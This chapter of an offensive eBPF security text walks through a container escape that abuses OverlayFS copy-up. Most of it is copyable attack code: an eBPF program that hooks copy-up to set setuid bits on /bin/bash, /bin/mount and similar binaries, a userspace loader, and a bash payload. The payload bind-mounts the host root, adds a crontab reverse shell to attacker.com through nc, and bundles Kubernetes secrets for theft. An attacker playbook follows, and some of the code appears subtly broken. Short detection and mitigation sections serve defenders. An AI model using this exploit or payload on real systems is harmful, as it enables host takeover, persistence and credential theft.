# The OverlayFS Trojan Horse: Container Escape Through Layer Manipulation

**Chapter 2: Breaking Out of the Box**

This chapter covers an OverlayFS copy-up race. A BPF program with `CAP_BPF` watches for `ovl_copy_up_one` on a target inode and emits the inode number to ringbuf. A privileged userspace racer drains the ringbuf and wins the write race to the upper-layer file before the container reads it back, injecting a modified payload. The primitive is a Class V composite per chapter 20's taxonomy: kernel-event-triggered userspace racer. It assumes the racer already holds `CAP_BPF` and the capability to write into the OverlayFS upper directory on the host.

```mermaid
%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
graph TD
    A[Container Access] -->|1. Trigger Copy-up| B[OverlayFS]
    B -->|2. Intercept| C[eBPF Program]
    C -->|3. Modify| D[Set-uid Payload]
    D -->|4. Write| E[Container Layer]
    E -->|5. Execute| F[Privilege Escalation]
    
    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
    style C fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
    style D fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
    style E fill:#7e5109,stroke:#f5cba7,stroke-width:2px
    style F fill:#a93226,stroke:#f5b7b1,stroke-width:2px
    
    click B "https://www.kernel.org/doc/html/latest/filesystems/overlayfs.html" "OverlayFS Documentation"
    click C "https://ebpf.io/what-is-ebpf/" "eBPF Documentation"
    click F "https://attack.mitre.org/techniques/T1611/" "Container Escape Technique"
```



**Why This Is Container Security's Nightmare**

Here's what keeps container security folks awake at night: containers aren't really containers. They're just processes with fancy filesystem tricks and some kernel namespaces sprinkled on top.

OverlayFS is the magic that makes containers feel isolated—it creates those neat little filesystem layers where your container thinks it owns the world. But here's the dirty secret: it's all just kernel code making decisions about which files you can see.

And if you can influence those decisions... well, suddenly those container walls start looking pretty thin.

The race happens inside a legitimate filesystem operation, so the container runtime's view is consistent with its own model of the world: OverlayFS reported a successful copy-up, the container read back the file it asked for. The modification is invisible at that layer because the runtime is not the component being lied to — the container's read is.

## How We Break Out

### Understanding the Container Filesystem Trick

Here's the thing about containers—they're basically an elaborate filesystem illusion. OverlayFS is the magician behind the curtain, making it look like each container has its own complete filesystem when really it's just:

- **Lower layers**: The read-only base image stuff (Ubuntu, Alpine, whatever)
- **Upper layer**: The writable scratch space where your changes go
- **Merged view**: The magic trick that makes it all look like one filesystem

The key insight? When you modify a file from the base image, OverlayFS has to "copy-up" that file from the read-only layer to the writable layer. And that copy-up process? That's where we strike.

```
┌─────────────────────────────────┐
│ Container View (Merged)         │
├─────────────────────────────────┤
│                                 │
│  ┌─────────────┐                │
│  │ Upper Layer │ (Writable)     │
│  │             │                │
│  │  modified   │                │
│  │  files      │                │
│  └─────────────┘                │
│         │                       │
│         │ Copy-up               │
│         ▼                       │
│  ┌─────────────┐                │
│  │ Lower Layer │ (Read-only)    │
│  │             │                │
│  │  base image │                │
│  │  files      │                │
│  └─────────────┘                │
│                                 │
└─────────────────────────────────┘
```

### How We Plant Our Trojan Horse

Our strategy is to intercept OverlayFS operations and inject malicious content during file modifications:

1. **Hook the Copy Operations**: We attach to functions like [`ovl_copy_up_one()`](https://elixir.bootlin.com/linux/latest/source/fs/overlayfs/copy_up.c) that handle file copying from lower to upper layers
2. **Pick Our Targets**: We filter for specific files we want to trojanize (like system binaries or scripts)
3. **Modify File Permissions**: We set the setuid bit or other dangerous permissions during the copy process
4. **Inject Our Payload**: We alter file contents to include backdoors, reverse shells, or other malicious code

The beauty is that this happens during legitimate filesystem operations, so it looks like normal system behavior.

### Building Our OverlayFS Trojan

```c
// @interactive: true
// @copyable: true
// OverlayFS Trojan Horse - eBPF exploitation proof of concept
// This demonstrates a practical attack scenario for container escape

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/version.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include <linux/path.h>
#include <linux/stat.h>
#include <linux/uio.h>

char LICENSE[] SEC("license") = "GPL";

// Target binaries to modify during copy-up
#define MAX_TARGETS 5
#define MAX_FILENAME_LEN 64

// Structure to track copy-up operations
struct copy_up_event {
    u32 pid;                // Process ID
    u8 comm[16];            // Command name
    u64 timestamp;          // Event timestamp
    char filename[MAX_FILENAME_LEN]; // Target filename
    u32 inode;              // Inode number
    u32 file_size;          // File size
    u32 modified;           // Whether we modified it
};

// Map to track files being copied up
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // Inode number as key
    __uint(value_size, sizeof(struct copy_up_event));
    __uint(max_entries, 1024);
} active_copy_ups SEC(".maps");

// Map to store target filenames
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, MAX_FILENAME_LEN);
    __uint(max_entries, MAX_TARGETS);
} target_filenames SEC(".maps");

// Map to track if we've initialized our targets
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(u32));
    __uint(max_entries, 1);
} initialized SEC(".maps");

// Perf event output for logging
struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(int));
    __uint(value_size, sizeof(int));
    __uint(max_entries, 1024);
} events SEC(".maps");

// Initialize our target filenames (would be set from user space)
static __always_inline void init_targets(void) {
    u32 key = 0;
    u32 *init = bpf_map_lookup_elem(&initialized, &key);
    
    if (!init || *init != 1) {
        // Target 1: /bin/bash (common shell)
        key = 0;
        char filename1[MAX_FILENAME_LEN] = "/bin/bash";
        bpf_map_update_elem(&target_filenames, &key, &filename1, BPF_ANY);
        
        // Target 2: /usr/bin/python3 (scripting capability)
        key = 1;
        char filename2[MAX_FILENAME_LEN] = "/usr/bin/python3";
        bpf_map_update_elem(&target_filenames, &key, &filename2, BPF_ANY);
        
        // Target 3: /bin/cp (file manipulation)
        key = 2;
        char filename3[MAX_FILENAME_LEN] = "/bin/cp";
        bpf_map_update_elem(&target_filenames, &key, &filename3, BPF_ANY);
        
        // Target 4: /bin/mount (for container escape)
        key = 3;
        char filename4[MAX_FILENAME_LEN] = "/bin/mount";
        bpf_map_update_elem(&target_filenames, &key, &filename4, BPF_ANY);
        
        // Target 5: /bin/ip (network manipulation)
        key = 4;
        char filename5[MAX_FILENAME_LEN] = "/bin/ip";
        bpf_map_update_elem(&target_filenames, &key, &filename5, BPF_ANY);
        
        // Mark as initialized
        key = 0;
        u32 value = 1;
        bpf_map_update_elem(&initialized, &key, &value, BPF_ANY);
    }
}

// Helper function to check if a file is in our target list
static __always_inline bool is_target_file(const char *filename) {
    init_targets();
    
    // Check against our list of targets
    for (int i = 0; i < MAX_TARGETS; i++) {
        u32 key = i;
        char *target = bpf_map_lookup_elem(&target_filenames, &key);
        
        if (!target)
            continue;
        
        // Simple string comparison (limited by BPF verifier)
        bool match = true;
        
        #pragma unroll
        for (int j = 0; j < MAX_FILENAME_LEN; j++) {
            if (filename[j] != target[j]) {
                match = false;
                break;
            }
            
            if (filename[j] == '\0')
                break;
        }
        
        if (match)
            return true;
    }
    
    return false;
}

// FIXED: Hook the start of the copy-up process
SEC("kprobe/ovl_copy_up_one")
int BPF_KPROBE(hook_copy_up_start, struct dentry *dentry) {
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Prepare event data
    struct copy_up_event event = {};
    event.pid = pid;
    bpf_get_current_comm(&event.comm, sizeof(event.comm));
    event.timestamp = bpf_ktime_get_ns();
    
    // FIXED: Get the filename properly
    char filename[MAX_FILENAME_LEN] = {};
    bpf_probe_read_kernel_str(filename, sizeof(filename), dentry->d_name.name);
    
    // FIXED: Simple path construction
    char fullpath[MAX_FILENAME_LEN] = {};
    if (filename[0] != '/') {
        fullpath[0] = '/';
        bpf_probe_read_kernel_str(&fullpath[1], sizeof(fullpath) - 1, filename);
    } else {
        bpf_probe_read_kernel_str(fullpath, sizeof(fullpath), filename);
    }
    
    // Copy filename to event
    __builtin_memcpy(event.filename, fullpath, sizeof(event.filename));
    
    // FIXED: Get inode number properly
    struct inode *inode = NULL;
    bpf_probe_read_kernel(&inode, sizeof(inode), &dentry->d_inode);
    if (inode) {
        u32 ino = 0;
        bpf_probe_read_kernel(&ino, sizeof(ino), &inode->i_ino);
        event.inode = ino;
        
        // Check if this is a target file
        if (is_target_file(fullpath)) {
            // Store the event for later correlation
            bpf_map_update_elem(&active_copy_ups, &ino, &event, BPF_ANY);
            
            // Log the event for our analysis
            bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
        }
    }
    
    return 0;
}

// FIXED: Hook file attribute setting during copy-up
SEC("kprobe/ovl_setattr")
int BPF_KPROBE(hook_setattr, struct dentry *dentry, struct iattr *attr) {
    // FIXED: Get inode number properly
    struct inode *inode = NULL;
    bpf_probe_read_kernel(&inode, sizeof(inode), &dentry->d_inode);
    if (!inode) return 0;
    
    u32 ino = 0;
    bpf_probe_read_kernel(&ino, sizeof(ino), &inode->i_ino);
    
    // Check if this is one of our tracked files
    struct copy_up_event *event = bpf_map_lookup_elem(&active_copy_ups, &ino);
    if (event) {
        // FIXED: Modify the setuid bit properly
        umode_t mode = 0;
        bpf_probe_read_kernel(&mode, sizeof(mode), &attr->ia_mode);
        mode |= S_ISUID;
        
        // FIXED: Write back the modified mode
        bpf_probe_write_user((void *)&attr->ia_mode, &mode, sizeof(mode));
        
        // Mark as modified
        event->modified = 1;
        bpf_map_update_elem(&active_copy_ups, &ino, event, BPF_ANY);
        
        // Log the modification
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, event, sizeof(*event));
    }
    
    return 0;
}

// FIXED: Hook file content writing during copy-up
SEC("kprobe/ovl_write_begin")
int BPF_KPROBE(hook_write_begin, struct file *file, loff_t pos, unsigned len, unsigned flags, struct page **pagep, void **fsdata) {
    // FIXED: Get inode number properly
    struct inode *inode = NULL;
    bpf_probe_read_kernel(&inode, sizeof(inode), &file->f_inode);
    if (!inode) return 0;
    
    u32 ino = 0;
    bpf_probe_read_kernel(&ino, sizeof(ino), &inode->i_ino);
    
    // Check if this is one of our tracked files
    struct copy_up_event *event = bpf_map_lookup_elem(&active_copy_ups, &ino);
    if (event) {
        // FIXED: Record the write operation details
        event->file_size = (u32)pos + len;
        bpf_map_update_elem(&active_copy_ups, &ino, event, BPF_ANY);
        
        // Log the event
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, event, sizeof(*event));
    }
    
    return 0;
}

// FIXED: Hook completion of copy-up (using a more reliable hook point)
SEC("kretprobe/ovl_copy_up_one")
int BPF_KRETPROBE(hook_copy_up_end, int ret) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Only process successful copy-up operations
    if (ret == 0) {
        // Create a completion event
        struct copy_up_event completion_event = {
            .pid = pid,
            .timestamp = bpf_ktime_get_ns(),
            .modified = 1,
        };
        bpf_get_current_comm(&completion_event.comm, sizeof(completion_event.comm));
        
        // Log the completion
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &completion_event, sizeof(completion_event));
    }
    
    return 0;
}
```

### User-Space Control Program

```c
// @interactive: true
// @copyable: true
// User-space program to load and control the OverlayFS Trojan Horse eBPF program

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "overlayfs_trojan.skel.h"

static volatile bool exiting = false;

// Payload to inject into target binaries
const char *PAYLOAD = 
    "#!/bin/bash\n"
    "# Container escape payload\n"
    "if [ \"$(id -u)\" = \"0\" ]; then\n"
    "  # We have root, attempt to escape\n"
    "  mkdir -p /tmp/.escape\n"
    "  mount --bind /proc/1/root /tmp/.escape\n"
    "  echo \"[+] Container escaped to /tmp/.escape\"\n"
    "  # Establish persistence\n"
    "  if [ -w /tmp/.escape/etc/crontab ]; then\n"
    "    echo \"* * * * * root nc -e /bin/bash attacker.com 4444\" >> /tmp/.escape/etc/crontab\n"
    "    echo \"[+] Persistence established\"\n"
    "  fi\n"
    "fi\n"
    "# Execute original binary to avoid suspicion\n"
    "exec /bin/bash.orig \"$@\"\n";

void handle_event(void *ctx, int cpu, void *data, unsigned int data_sz) {
    struct copy_up_event *e = data;
    printf("[%s] Copy-up event: PID %d (%s) - File: %s, Modified: %s\n",
           e->timestamp, e->pid, e->comm, e->filename, 
           e->modified ? "YES" : "NO");
}

static void sig_handler(int sig) {
    exiting = true;
}

int main(int argc, char **argv) {
    struct overlayfs_trojan_bpf *skel;
    struct perf_buffer *pb = NULL;
    int err;

    // Set up signal handler
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // Increase resource limits
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY,
    };
    setrlimit(RLIMIT_MEMLOCK, &rlim);

    // Load and verify BPF program
    skel = overlayfs_trojan_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    // Attach BPF programs
    err = overlayfs_trojan_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton: %d\n", err);
        goto cleanup;
    }

    // Set up perf buffer for events
    pb = perf_buffer__new(bpf_map__fd(skel->maps.events), 64, handle_event, NULL, NULL, NULL);
    if (!pb) {
        err = -1;
        fprintf(stderr, "Failed to create perf buffer: %d\n", err);
        goto cleanup;
    }

    printf("OverlayFS Trojan Horse eBPF program successfully loaded and attached!\n");
    printf("Waiting for copy-up operations on target files...\n");
    printf("Press Ctrl+C to exit\n");

    // Main loop
    while (!exiting) {
        err = perf_buffer__poll(pb, 100);
        if (err < 0 && err != -EINTR) {
            fprintf(stderr, "Error polling perf buffer: %d\n", err);
            goto cleanup;
        }
    }

cleanup:
    perf_buffer__free(pb);
    overlayfs_trojan_bpf__destroy(skel);
    return err < 0 ? -err : 0;
}
```

### Container Escape Payload

The injected payload is designed to escape the container by mounting the host's root filesystem:

```bash
#!/bin/bash
# Container escape payload

if [ "$(id -u)" = "0" ]; then
  # We have root, attempt to escape
  mkdir -p /tmp/.escape
  mount --bind /proc/1/root /tmp/.escape
  echo "[+] Container escaped to /tmp/.escape"
  
  # Establish persistence
  if [ -w /tmp/.escape/etc/crontab ]; then
    echo "* * * * * root nc -e /bin/bash attacker.com 4444" >> /tmp/.escape/etc/crontab
    echo "[+] Persistence established"
  fi
  
  # Exfiltrate sensitive data
  if [ -d /tmp/.escape/etc/kubernetes ]; then
    tar czf /tmp/k8s-secrets.tar.gz /tmp/.escape/etc/kubernetes
    # Exfiltration would happen here
  fi
fi

# Execute original binary to avoid suspicion
exec /bin/bash.orig "$@"
```

### Detection Methods

Defenders should implement multiple layers of detection:

1. **eBPF Program Monitoring**:
   - Monitor for eBPF programs attaching to OverlayFS-related functions
   - Track eBPF program loading patterns and verify signatures
   - Use tools like `bpftool` to list and inspect loaded programs

2. **File Integrity Monitoring**:
   - Implement checksums for critical binaries in container images
   - Monitor for unexpected set-uid binaries in container layers
   - Use tools like `auditd` to track file permission changes

3. **Container Runtime Security**:
   - Use read-only containers where possible
   - Implement seccomp profiles to restrict mount operations
   - Deploy container runtime security tools like Falco or Tracee

4. **Specific Indicators**:
   - New set-uid binaries appearing in container layers
   - Unexpected modifications to binaries in container environments
   - Unusual mount operations within containers
   - Suspicious network connections from container processes

### Mitigation Strategies

1. **Restrict eBPF Capabilities**:
   ```bash
   # Remove CAP_BPF and CAP_SYS_ADMIN from container
   docker run --cap-drop=bpf --cap-drop=sys_admin --security-opt no-new-privileges ...
   
   # In Kubernetes
   securityContext:
     capabilities:
       drop:
         - BPF
         - SYS_ADMIN
   ```

2. **Use Read-Only Containers**:
   ```bash
   # Docker read-only container
   docker run --read-only ...
   
   # Kubernetes Pod with read-only root filesystem
   securityContext:
     readOnlyRootFilesystem: true
   ```

3. **Implement File Integrity Monitoring**:
   ```bash
   # Example using inotify to monitor file changes
   inotifywait -m -r /var/lib/docker/overlay2 -e modify -e attrib |
   while read path action file; do
     if [[ "$file" == *.bin || "$file" == *.sh ]]; then
       echo "Alert: $file was $action in $path"
     fi
   done
   ```

### Real-world Impact

In practical environments, this technique could allow an attacker to:
- **Container escape**: Gain root access on the host by exploiting the container boundary
- **Multi-tenant compromise**: Access data from other containers sharing the same host
- **Persistent backdoors**: Install difficult-to-detect backdoors that survive container restarts
- **Privilege escalation chains**: Combine with other vulnerabilities to move laterally through a cluster
- **Supply chain attacks**: Compromise build environments to inject malicious code into production images

The ability to silently modify files during copy-up operations creates a particularly concerning scenario for cloud environments and managed Kubernetes services where multiple customers share the same infrastructure.

## Detection

The container security teams will try to stop our OverlayFS manipulation with these defenses:

1. **Strip eBPF capabilities** from container environments completely
2. **Deploy BPF LSM policies** to restrict who can load eBPF programs
3. **Use read-only containers** where the filesystem can't be modified
4. **Monitor for suspicious binaries** with unexpected set-uid bits in container layers
5. **Implement file integrity monitoring** for critical container files
6. **Switch storage drivers** away from OverlayFS if they can't mitigate the risks

But here's the dirty secret—most production environments can't function without writable containers, and OverlayFS is everywhere.

## Our Container Escape Playbook

Here's how we turn containers into stepping stones:

1. **Scout the target** - Identify containers using OverlayFS (basically all Docker/Kubernetes environments)
2. **Craft our trojan** - Develop eBPF programs that hook into OverlayFS copy-up functions
3. **Get our hooks loaded** - Load the malicious BPF program with appropriate privileges
4. **Trigger the magic** - Modify files within the container to initiate copy-up operations
5. **Inject our payload** - Let our eBPF program intercept and modify files, adding set-uid bits
6. **Execute and escalate** - Run the modified binary to escalate privileges
7. **Break out** - Use elevated privileges to escape container isolation completely

## Their Defense Playbook

The blue team will try to lock us down with:

1. **Capability stripping** - Remove [`CAP_BPF`](https://man7.org/linux/man-pages/man7/capabilities.7.html) from container environments
2. **BPF access controls** - Implement BPF LSM policies to restrict eBPF program loading
3. **Read-only filesystems** - Use immutable containers where possible
4. **Binary monitoring** - Watch for unexpected set-uid binaries in container layers
5. **File integrity checks** - Monitor critical container files for unauthorized changes
6. **Storage driver alternatives** - Consider moving away from OverlayFS entirely

## Scope

The primitive assumes an attacker who already holds `CAP_BPF` on the host and can write to the OverlayFS upper directory. It does not escalate from an unprivileged container process. The relevant defender controls are in chapter 22: restrict `CAP_BPF` holders, baseline loaded BPF programs, and apply integrity monitoring to OverlayFS upper layers where threat model requires it.

## POC

Companion code: [`ch02-overlayfs`]({{ site.baseurl }}/dBPF-pocs/pocs/ch02-overlayfs/)
